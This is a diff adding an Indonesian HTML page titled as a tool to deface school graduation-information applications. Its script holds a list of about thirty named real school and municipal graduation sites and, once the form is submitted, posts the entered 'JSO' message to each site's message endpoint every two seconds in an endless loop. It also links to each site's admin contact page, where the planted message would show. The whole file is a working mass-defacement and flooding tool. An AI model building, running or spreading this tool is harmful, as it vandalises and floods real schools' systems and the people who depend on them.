@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-JSO</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        input, textarea, button {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background: #007BFF;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .output {
+            margin-top: 20px;
+            padding: 10px;
+            background: #e7f3ff;
+            border-left: 5px solid #007BFF;
+            font-size: 0.9rem;
+            overflow-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>DEFACE-APLIKASI-SEKOLAH-INFORMASI-KELULUSAN</h1>
+        <form id="messageForm">
+            <label for="nama">Nama:</label>
+            <input type="text" id="nama" name="nama" placeholder="Masukkan nama Anda" required>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" placeholder="Masukkan email Anda" required>
+
+            <label for="pesan">JSO MU:</label>
+            <textarea id="pesan" name="pesan" rows="5" placeholder="Masukkan pesan Anda" required></textarea>
+
+            <button type="submit">Kirim Pesan</button>
+        </form>
+
+        <div class="output" id="output"></div>
+    </div>
+
+<script>
+    const urls = [
+        "https://www.pengumuman.smkp6jatisrono.sch.id/index.php?page=kirimpesan",
+        "https://www.sman1ambarawalpg.sch.id/asik/index.php?page=kirimpesan",
+        "https://www.un2020.smkn3baubau.sch.id/index.php?page=kirimpesan",
+    "https://www.pengumuman.smkp6jatisrono.sch.id/index.php?page=kirimpesan",
+    "https://www.sman1ambarawalpg.sch.id/asik/index.php?page=kirimpesan",
+    "https://www.un2020.smkn3baubau.sch.id/index.php?page=kirimpesan",
+    "https://www.pengumuman.man1kuburaya.sch.id/index.php?page=kirimpesan",
+    "https://www.kelulusan.smkn1lebakgedong.sch.id/index.php?page=kirimpesan",
+    "https://kelulusan.smpnegeri4demak.sch.id/index.php?page=kirimpesan",
+    "https://kelulusan.smansabuntok.sch.id/index.php?page=kirimpesan",
+    "https://pengumumanppdb.smansatupraya.sch.id/index.php?page=kirimpesan",
+    "https://smkn4purworejo.sch.id/lulussmk4/index.php?page=kirimpesan",
+    "http://kelulusan.sman1subang.sch.id/index.php?page=kirimpesan",
+    "https://sman2kalianda.sch.id/kelulusan/index.php?page=kirimpesan",
+    "https://info.labschoolcibubur.sch.id/osissmp/index.php?page=kirimpesan",
+    "https://smpn15.semarangkota.go.id/lulus2020/index.php?page=kirimpesan",
+    "https://info.smulandu2-jbg.sch.id/index.php?page=kirimpesan",
+    "https://kelulusan.mtsnurululumkoga.sch.id/index.php?page=kirimpesan",
+    "https://kelulusan.sman1polokarto.sch.id/index.php?page=kirimpesan",
+    "https://kelulusan.smkn2purwodadi.sch.id/2019/index.php?page=kirimpesan",
+    "https://www.kelulusan.smk1pbs.sch.id/index.php?page=kirimpesan",
+    "http://www.smp1kencong.sch.id/lulusan/index.php?page=kirimpesan",
+    "https://lulus.mamafdacipari.com/index.php?page=kirimpesan",
+    "https://smp1kaliori.sch.id/kelulusan/index.php?page=kirimpesan",
+    "https://lulus.mtsn15jkt.sch.id/index.php?page=kirimpesan",
+    "https://info-kelulusan.smkn27jkt.sch.id/index.php/index.php?page=kirimpesan",
+    "https://kelulusan.smp1kaliori.sch.id/index.php?page=kirimpesan",
+    "https://kelulusan.smkn1paringin.sch.id/panel/indez.php?page=kirimpesan",
+    "https://sma1sukodono.sch.id/kelulusan/index.php?page=kirimpesan",
+    "https://pengumuman.sman12batam.sch.id/index.php?page=kirimpesan"
+    ];
+
+    const hasil = [
+        "https://www.pengumuman.smkp6jatisrono.sch.id/admin/hubungi.php",
+        "https://www.sman1ambarawalpg.sch.id/asik/admin/hubungi.php",
+        "https://www.un2020.smkn3baubau.sch.id/admin/hubungi.php",
+    "https://www.pengumuman.smkp6jatisrono.sch.id/admin/hubungi.php",
+    "https://www.sman1ambarawalpg.sch.id/asik/admin/hubungi.php",
+    "https://www.un2020.smkn3baubau.sch.id/admin/hubungi.php",
+    "https://www.pengumuman.man1kuburaya.sch.id/admin/hubungi.php",
+    "https://www.kelulusan.smkn1lebakgedong.sch.id/admin/hubungi.php",
+    "https://kelulusan.smpn2grabag-magelang.sch.id/admin/hubungi.php",
+    "https://kelulusan.smpnegeri4demak.sch.id/admin/hubungi.php",
+    "https://kelulusan.smansabuntok.sch.id/admin/hubungi.php",
+    "https://pengumumanppdb.smansatupraya.sch.id/admin/hubungi.php",
+    "https://smkn4purworejo.sch.id/lulussmk4/admin/hubungi.php",
+    "http://kelulusan.sman1subang.sch.id/admin/hubungi.php",
+    "https://sman2kalianda.sch.id/kelulusan/admin/hubungi.php",
+    "https://info.labschoolcibubur.sch.id/osissmp/admin/hubungi.php",
+    "https://smpn15.semarangkota.go.id/lulus2020/admin/hubungi.php",
+    "https://info.smulandu2-jbg.sch.id/admin/hubungi.php",
+    "https://kelulusan.mtsnurululumkoga.sch.id/admin/hubungi.php",
+    "https://kelulusan.sman1polokarto.sch.id/admin/hubungi.php",
+    "https://kelulusan.smkn2purwodadi.sch.id/2019/admin/hubungi.php",
+    "https://www.kelulusan.smk1pbs.sch.id/admin/hubungi.php",
+    "http://www.smp1kencong.sch.id/lulusan/admin/hubungi.php",
+    "https://lulus.mamafdacipari.com/admin/hubungi.php",
+    "https://smp1kaliori.sch.id/kelulusan/admin/hubungi.php",
+    "https://lulus.mtsn15jkt.sch.id/admin/hubungi.php",
+    "https://info-kelulusan.smkn27jkt.sch.id/admin/hubungi.php",
+    "https://kelulusan.smp1kaliori.sch.id/admin/hubungi.php",
+    "https://kelulusan.smkn1paringin.sch.id/panel/admin/hubungi.php",
+    "https://sma1sukodono.sch.id/kelulusan/admin/hubungi.php",
+    "https://pengumuman.sman12batam.sch.id/admin/hubungi.php"
+    ];
+
+    document.getElementById('messageForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const nama = document.getElementById('nama').value;
+        const email = document.getElementById('email').value;
+        const pesan = document.getElementById('pesan').value;
+
+        const data = new URLSearchParams({ nama, email, pesan });
+        const outputDiv = document.getElementById('output');
+        outputDiv.innerHTML = "Mengirim data berulang setiap 2 detik...";
+
+        let index = 0;
+
+        // Fungsi untuk mengirim data secara berulang
+        const interval = setInterval(async () => {
+            if (index >= urls.length) {
+                index = 0; // Kembali ke URL pertama setelah semua URL selesai
+            }
+
+            try {
+                const response = await fetch(urls[index], {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: data
+                });
+
+                if (response.ok) {
+                    outputDiv.innerHTML += `<p><b>URL:</b> ${urls[index]} - <span style="color:green;">Pesan berhasil dikirim. Hasil: <a href="${hasil[index]}" target="_blank">${hasil[index]}</a></span></p>`;
+                } else {
+                    outputDiv.innerHTML += `<p><b>URL:</b> ${urls[index]} - <span style="color:red;">Gagal mengirim pesan. Status: ${response.status}</span></p>`;
+                }
+            } catch (error) {
+                outputDiv.innerHTML += `<p><b>URL:</b> ${urls[index]} - <span style="color:red;">Terjadi kesalahan: ${error.message}</span></p>`;
+            }
+
+            index++;
+        }, 2000); // Interval pengiriman setiap 2 detik
+    });
+</script>
+</body>
+</html>
